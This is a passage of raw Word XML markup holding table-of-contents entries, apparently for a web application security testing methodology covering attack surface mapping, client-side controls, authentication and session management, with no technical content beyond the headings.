                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Identify functionality and data entry points</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836570 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="42FAF15D"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1" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2.2</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Identify technologies</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836571 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="300A4E02"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2" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.2.3</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Map the attack surface</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836572 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="165F78AC"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73" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.3</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Procedure: Test Client-Side Controls</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836573 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="67A51F12"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4" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.3.1</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Transmission of data via client</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836574 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="44A5E568"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5" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.3.2</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Client-side input Controls</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836575 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2B5EA7E4"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6" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.3.3</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Browser Extensions</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836576 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="695B98E3"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77" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Procedure: Test Authentication</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836577 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7A052C1B"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8" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.1</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Understand the Mechanism</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836578 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3379FA60"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79" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.2</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Data attacks</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836579 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6987045F"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0" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.3</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Special Functions</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836580 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7BBFA5FF"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1" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.4</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Credential Handling</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836581 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="025020A6"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2" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.5</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Authentication Logic</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836582 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="57014144"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3" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.6</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploit Vulnerabilities</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836583 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6631BA0D"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84" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Procedure: Test Session Management</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836584 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1CBB683B"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5" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
